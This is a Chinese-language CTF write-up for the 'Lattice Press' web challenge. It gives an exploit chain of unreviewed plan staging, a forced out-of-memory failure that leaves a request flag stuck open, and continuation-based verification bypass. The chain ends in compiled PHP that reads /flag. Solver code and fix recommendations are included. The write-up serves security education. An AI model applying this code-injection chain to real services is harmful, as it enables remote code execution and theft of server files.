# Lattice Press - statement preview workspace

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-2A62275D` · 状态 solved
```

## 一句话

Lattice Press is the internal preview service the operations team uses to turn statement plans into review frames.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-2A62275D.zip` | 926 B | `d59759cc9d0c…` |
| `zip/README.txt` | 1.6 KB | `ad2990104aca…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 1. 应用结构

docker-compose.yml 两个服务：

• flag-rotator：把 $ANSWER_FLAG 写进 answers 卷的 /out/flag；
• app：php:8.5.11-apache，编译并启用 ext/planrt，把该卷以只读方式挂到 /answers/flag，并 ln -s /answers/flag /flag。

Apache 配置（services/app/conf/zz-lattice.conf）刻意只有一个 worker：

StartServers 1 / MinSpareServers 1 / MaxSpareServers 1

MaxRequestWorkers 1 / ServerLimit 1 / MaxConnectionsPerChild 0

KeepAlive Off / MaxKeepAliveRequests 1

→ 整个实例只有一个常驻进程，planrt 的 LANE 全局结构就是“这条 lane”。

services/app/public/index.php 的路由（12 条，GET / 上列全）：

| 路由 | 作用 |
| --- | --- |
| POST /api/plans | 写 plans/<slug>.json（body 1 B–64 KiB），不做任何内容审查 |
| GET /api/plans、GET /api/plans/{slug} | 列表 / 单条（含 body） |
| POST /api/plans/{slug}/stage | 把 body 写到 staging/<lane>.plan，返回 stage_token = sha256(slug\|lane\|checksum)[:32] |
| POST /api/plans/{slug}/attach | 校验 token，下发 Set-Cookie: lattice_lane=<lane>、lattice_plan=<slug> |
| POST /api/plans/{slug}/verify | review_text() 拒绝含 <?/?> 的 body；通过后 planrt_verify() 把 warm plan 标记为已审 |
| GET/POST /api/plans/{slug}/preview | lane 的 warm plan 已审 → planrt_render() |
| POST /api/runtime/lane/refresh | enter_rotation() + 清 staging |
| POST /api/plans/{slug}/preview-legacy | enter_rotation() + 把 body htmlspecialchars 后回显 |
| GET /api/diagnostics、/api/runtime/profile、/api/export/report.csv、/healthz | 诊断 / profile / CSV / 静态 ok |

存储布局：/var/lib/lattice/{plans,staging,instance,history,limits,sessions}。

### 2. 关键源码

**2.1 审查只覆盖 verify（index.php:181-194, 486-529）**

```php
function review_text(string $body): array {
if (strpos($body, '<?') !== false || strpos($body, '?>') !== false) {
$notes[] = 'Plan text may not contain markup blocks.';
$supported = false;
}
```

...

```
}
```

$body   = (string) $plan['body'];          // 来自 register

```php
$warm   = planrt_warm();
```

$warmBody = planrt_read();                  // 来自 lane 的 warm plan

```php
$warmOk = is_string($warmBody) && $warmBody === $body;
$review = review_text($body);
$verified = $checksumOk && $versionOk && $warmOk && $review['ok'];
if ($verified) { planrt_verify(); }
```

POST /api/plans 只校验类型/长度（index.php:349-387），stage 直接把 body 落盘（index.php:431-455），两条写入路径都没有 <? 检查。所以“register 里有 PHP 代码”是允许的，只有 verify 会拦。

**2.2 lane 是进程级全局，跨请求存活（planrt.c:30-46, 153-222）**

```
typedef struct {
uint64_t batches, starts, finishes, generation, renders;
int      in_request;       /* a batch is open on this lane */
int      continuation;     /* this batch picked up the lane's open state */
int      plan_verified;
int      plan_continuation;
size_t   plan_len;
char    *plan;             /* lane-resident plan body */
size_t   window_len;
char    *window;
} planrt_lane;
static planrt_lane *LANE = NULL;
```

PHP_RINIT_FUNCTION(planrt) {

```
LANE->batches++; LANE->starts++; LANE->continuation = 0;
```

planrt_lane_id(lane, sizeof(lane));           /* pid*2654435761 & 0xffffffff，%08lx */

```
if (planrt_instance_in_rotation()) {          /* instance/rotation.state 存在 */
planrt_release_plan(); LANE->continuation = 0;
} else if (LANE->in_request) {                /* ← 上一个 batch 没关 */
LANE->continuation = 1;
if (LANE->plan) { LANE->plan_verified = 1; LANE->plan_continuation = 1; }
} else if (planrt_cookie_is_lane(lane)) {     /* Cookie: lattice_lane=<lane> */
```

planrt_warm_staged(lane);                 /* 读 staging/<lane>.plan */

```
}
```

LANE->in_request = 1;                         /* ← 先置位 */

...

```
{   /* ← 然后才按 X-Render-Window emalloc */
char *v = sapi_getenv("HTTP_X_RENDER_WINDOW", ...);
zend_long n = ZEND_ATOL(v);
if (n > 0 && n <= PLANRT_MAX_WINDOW) {     /* MAX_WINDOW = 1<<30 */
LANE->window = emalloc((size_t)n);
memset(LANE->window, 'W', (size_t)n);
LANE->window_len = (size_t)n;
}
}
return SUCCESS;
}
```

PHP_RSHUTDOWN_FUNCTION(planrt) {

```
if (LANE) {
```

...

```
if (LANE->plan && (!LANE->plan_verified || LANE->plan_continuation))
```

planrt_release_plan();                /* 未审 / continuation 的 plan 释放 */

LANE->in_request = 0;                     /* ← 正常关 batch */

```
LANE->generation++;
}
return SUCCESS;
}
```

因为 in_request = 1 写在窗口分配之前，而 1 GiB 的 emalloc 在 memory_limit=128M 下必然 OOM bailout，RINIT 走不完 —— 只要这个 bailout 让 RSHUTDOWN 没执行，in_request 就永远停在 1。

**2.3 渲染就是编译执行（planrt.c:295-323）**

PHP_FUNCTION(planrt_render) {

```
if (!LANE || !LANE->plan || !LANE->plan_verified) RETURN_FALSE;
LANE->renders++;
code = zend_string_init(LANE->plan, LANE->plan_len, 0);
op = zend_compile_string(code, "lattice.plan", ZEND_COMPILE_POSITION_AT_OPEN_TAG);
if (!op) { ... RETURN_FALSE; }
ZVAL_UNDEF(&retval);
zend_execute(op, &retval);
```

...

```
}
```

ZEND_COMPILE_POSITION_AT_OPEN_TAG 表示这段字符串是一个完整文件（从 HTML 状态开始），所以纯文本 plan 只是被当内联 HTML 输出（这也是为什么之前 {{row}} 永远原样出现），而带 <?php … ?> 的 plan 就是可执行代码。

preview 的门槛只有 planrt_warm()['verified']（index.php:531-553）：

```php
$warm = planrt_warm();
if (!(bool) $warm['verified']) fail('plan_not_ready', ..., 409);
ob_start(); $rendered = planrt_render(); $html = (string) ob_get_clean();
```

### 3. 漏洞与利用

三个缺陷串起来：

1. 审查只在一处：stage 不过滤，register 可以存 <?php … ?>。
2. batch 状态可被 OOM 卡住：X-Render-Window: 1073741824 在 RINIT 里 emalloc(1 GiB) 失败，bailout 发生在 in_request = 1 之后、RSHUTDOWN 之前。
3. continuation 分支无条件信任：下一个请求看到 in_request=1 就把当前 LANE->plan（此时是上一请求从 staging 读进来的 PHP 正文）标记为 plan_verified = 1，完全不经过 review_text()。

时序

① POST /api/plans   {slug:"fl", body:"warm lane\n"}          # 干净体

② POST /api/plans/fl/stage                                   # staging/<lane>.plan = "warm lane\n"

③ POST /api/plans/fl/attach {stage_token}                     # Set-Cookie lattice_lane=81af14c1

④ POST /api/plans/fl/verify                                  # 200 verified:true, warm_bytes:10

```php
⑤ POST /api/plans   {slug:"fl", body:"<?php echo file_get_contents(\"/flag\"); ?>"}
```

⑥ POST /api/plans/fl/stage                                    # staging/<lane>.plan = PHP 正文（stage 不审查）

⑦ GET  /api/diagnostics   X-Render-Window: 1073741824        # RINIT: 先 warm ⑥ 的 PHP 正文 → emalloc OOM → 500

#   in_request 仍为 1

⑧ GET  /api/plans/fl/preview                                  # RINIT: continuation → plan_verified=1

#   planrt_render 编译执行 PHP → 输出 flag

第 ⑦ 步是关键：必须带 lattice_lane cookie，否则 RINIT 不会把第 ⑥ 步的 PHP 正文 warm 进来，continuation 时编译的还是旧文本。第 ⑧ 步不能再带其它会触发 warm 的中间请求；preview 自身直接命中 continuation 分支。

实测（同一实例重复两次一致）：

```
verify  -> 200 {"verified":true,"checksum_ok":true,"version_supported":true,"lane_ready":true,"warm_bytes":10}
```

oom     -> 500

```
preview -> 200 {"html":"<div class=\"lp-frame\">«FLAG»</div>"}
```

### 4. 复现

**4.1 环境**

实例由平台创建：GET /api/v1/instances/<id> 拿到 services[0].host（形如 {{INSTANCE_HOST}}）和 vpn_endpoint；GET /api/v1/instances/<id>/vpn-config 拿到 WireGuard 配置（去掉 DNS = 行后 wg-quick up）。本机没有 Windows 管理员权限，所以隧道放在 WSL：

install -d -m 700 /etc/wireguard

grep -v '^[[:space:]]*DNS' vpn.conf > /etc/wireguard/lat.conf

wg-quick down lat 2>/dev/null; wg-quick up lat

grep -q ' {{INSTANCE_HOST}}$' /etc/hosts || echo '172.16.39.2 {{INSTANCE_HOST}}' >> /etc/hosts

（services[0].host 解析到子网的第 2 个地址：Address = 172.16.39.254/32 → app = 172.16.39.2。）

**4.2 一键脚本**

lattice_press/solve_lattice.py（纯 http.client，自带 cookie jar，UA lattice-collector/1.4 拿更大的 lane 预算）：

```
LP_HOST={{INSTANCE_HOST}} LP_CONNECT=172.16.39.2 python3 solve_lattice.py
```

核心代码：

# 1) 让 lane 持有一个“已审”的 warm plan

call("POST", "/api/plans", {"slug": slug, "body": "warm lane\n"})

```
tok = call("POST", "/api/plans/%s/stage" % slug, {})[1]["stage_token"]
```

call("POST", "/api/plans/%s/attach" % slug, {"stage_token": tok})   # 收 Set-Cookie

call("POST", "/api/plans/%s/verify" % slug, {})                     # 200 verified

# 2) 把 register 与 staged 文件换成 PHP（stage 不审查）

```php
php = '<?php echo file_get_contents("/flag"); ?>'
```

call("POST", "/api/plans", {"slug": slug, "body": php})

call("POST", "/api/plans/%s/stage" % slug, {})

# 3) 1 GiB 窗口：RINIT 先 warm PHP 正文，再 OOM，batch 留在打开状态

call("GET", "/api/diagnostics", None, {"X-Render-Window": "1073741824"})   # 500

# 4) continuation 请求：plan_verified 被强制置 1，planrt_render 编译执行 PHP

st, js, _ = call("GET", "/api/plans/%s/preview" % slug)

```
print(js["html"])     # <div class="lp-frame">«FLAG»</div>
```

**4.3 关键实现细节（容易踩的坑）**

• attach 只负责下发 cookie；后续每个请求都要回带 Cookie: lattice_lane=81af14c1，否则 RINIT 不会 planrt_warm_staged()，verify 永远 lane_ready:false。这是最初卡住最久的地方。
• stage_token = sha256(slug|lane|checksum)[:32]，本地可算；但 attach 用旧 token 会 409 stage_stale，而 409 会把 lane 拖进 rotation，所以每次 attach 前重新 stage。
• 1 GiB 窗口只对当前进程生效；如果第 ⑦ 步之后 in_request 被正常清零（例如失败重试时 RSHUTDOWN 跑了），第 ⑧ 步会返回旧的 warm 文本，脚本里因此做了“重新 verify 干净体 → 重新 stage PHP 体 → 再 OOM”的重试。
• warm_bytes 是 lane 当前 warm plan 的长度，不是 URL 里 slug 的长度；preview 用任意已注册 slug 都能渲染 lane 的 warm plan（这也是一个独立的信息泄露点，但拿 flag 不需要它）。

### 5. 陷阱（题面注释是诱饵）

• POST /api/runtime/lane/refresh 与 POST /api/plans/<slug>/preview-legacy 都调用 enter_rotation()，写 instance/rotation.state；没有任何代码删除这个文件，之后所有 stage/attach 永远 409 {"code":"lane_busy","message":"The lane is being rotated for maintenance; retry later."}。三个种子 plan 的 manifest.notes 恰好都在推荐这两个操作 —— 照着做就把实例打废，只能重建。
• refresh 还会 planrt_discard() 并删 staging，等于把 warm 状态也清了。
• 无 cookie 的 preview 在干净实例上必 409（没有 warm plan）。
• validate_slug/manifest.version 的报错信息（plan_slug_invalid、manifest_version_unsupported）都是正常校验，不是漏洞点。

### 6. 修复建议

1. 不要编译用户文本：plan 正文应该是纯数据；如果确实要模板化，用受限的占位符替换而不是 zend_compile_string。
2. 审查必须在所有写入路径（POST /api/plans、stage）以及渲染前都做，不能只在 verify。
3. in_request 必须在 bailout/异常路径里也能复位（例如用 zend_try/zend_catch 或注册 request shutdown 的兜底），或者干脆把 batch 状态绑到真实连接而不是进程全局。
4. rotation 需要一条退出路径（hand-back），且 refresh/preview-legacy 不应把整个 lane 永久锁死。

### 7. 附录：源码行号

• lattice_src/services/app/public/index.php:181-194 — review_text()（只查 <?/?>）
• index.php:349-387 — POST /api/plans（不审查）
• index.php:431-455 — stage（写 staging/<lane>.plan，token 计算）
• index.php:457-484 — attach（下发 cookie）
• index.php:486-529 — verify（审查 + planrt_verify()）
• index.php:531-553 — preview（planrt_warm()['verified'] → planrt_render()）
• index.php:153-166 — enter_rotation()（写 rotation.state，无退出）
• lattice_src/services/app/ext/planrt/planrt.c:153-199 — RINIT（continuation 分支、in_request=1 先于窗口分配）
• planrt.c:201-222 — RSHUTDOWN（in_request=0、释放未审 plan）
• planrt.c:295-323 — planrt_render()（zend_compile_string + zend_execute）
• planrt.c:104-140 — planrt_warm_staged()（读 staging，内容相同则保留 review 状态）
• lattice_src/services/app/conf/zz-lattice.conf — 单 worker（lane id 恒定 81af14c1）
• lattice_src/services/app/Dockerfile — ln -s /answers/flag /flag、chown www-data /var/lib/lattice

### 8. 证据与产物

| 文件 | 内容 |
| --- | --- |
| lattice_press/solve_lattice.py | 端到端利用脚本（本次两次跑出同一 flag） |
| lattice_press/flag.py | 首次手动链（含逐步输出） |
| lattice_press/continuation.py | 验证 <?php echo 42; ?> 被执行的判定实验 |
| lattice_press/live2.jsonl | 早期所有交互记录（含踩坑过程） |
| lattice_src/ | 解压后的完整附件源码 |

## 结果

- flag sha256：`1716cf69dbeae554ba1e73e63515ff96b18e994469ac9fb0a2bd3140bef9d828`, `42a7d3ca39c25ecaeac6689b222d00dbefe637e46855eba8f42867c656dafd3a`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/STATUS.md`

## 待核实

- 本条目由 WP 第 6 节《Lattice Press - statement preview workspace》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
